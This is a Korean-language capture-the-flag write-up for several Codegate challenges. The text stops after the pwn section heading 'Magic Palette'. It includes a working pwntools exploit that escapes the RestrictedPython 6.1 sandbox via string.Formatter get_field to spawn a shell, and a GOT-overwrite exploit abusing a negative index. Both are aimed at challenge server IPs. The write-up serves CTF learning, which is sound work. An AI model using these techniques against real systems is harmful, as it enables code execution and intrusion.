### shielder(조수호) 

1. misc/Hello Codegate
2. misc/Captcha World
3. misc/safePythonExecutor
4. pwn/What's Happening?
5. pwn/Magic Palette
6. crypto/Encrypted flag
7. rev/inital
8. rev/C0D3Matr1x
9. web/Ping Tester

---
## misc/Hello Codegate

디코 `notice` 채널에 플래그가 나와있다.

---
## misc/Captcha World

캡챠를 입력해야 한다. 근데 10번만 하면 되기 때문에 그냥 직접 입력해주면 된다.

---
## misc/safePythonExecutor

중요한 것은 `RestrictedPython==6.1`이다. CVE를 찾아보니 format, format_map, formatter 쪽에 필터링 실패 취약점이 있다고 한다.

https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md

위의 라업 논리를 그대로 따라가면 똑같은 방법으로 풀 수 있다.

### exploit.py

```python
from pwn import *

p = remote('3.35.196.167', 42424)
#p = process(['python3', 'prob.py'])

#dt = '''string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")'''
dt = '''
class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); 
Baz().format("{0.Random.__init__.__globals__[_os].system}", random)
'''.replace('\n', '\r')
p.sendlineafter(b': ', dt)
p.send(b'\n')
p.interactive()
```

---
## pwn/What's Happening?

pie가 꺼져 있다. Partial RELRO이다. 행성 정보 업데이트를 하는데 음수 인덱스를 안 막아 놨다. 그래서 got overwrite가 된다. puts got을 win 함수로 덮으면 된다. system got이 망가지긴 하는데, pie가 꺼져 있어서 그냥 다시 입력 해주면 된다.

### exploit.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./prob')
p = remote('3.37.174.221', 33333)
e = ELF('./prob')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'-3')
p.sendlineafter(b': ', p64(e.sym['win']) + b'a' * 8 + p64(0x401080))
p.sendlineafter(b': ', b'0')
#gdb.attach(p)
p.sendlineafter(b': ', b'0')
p.interactive()
```

---

## pwn/Magic Palette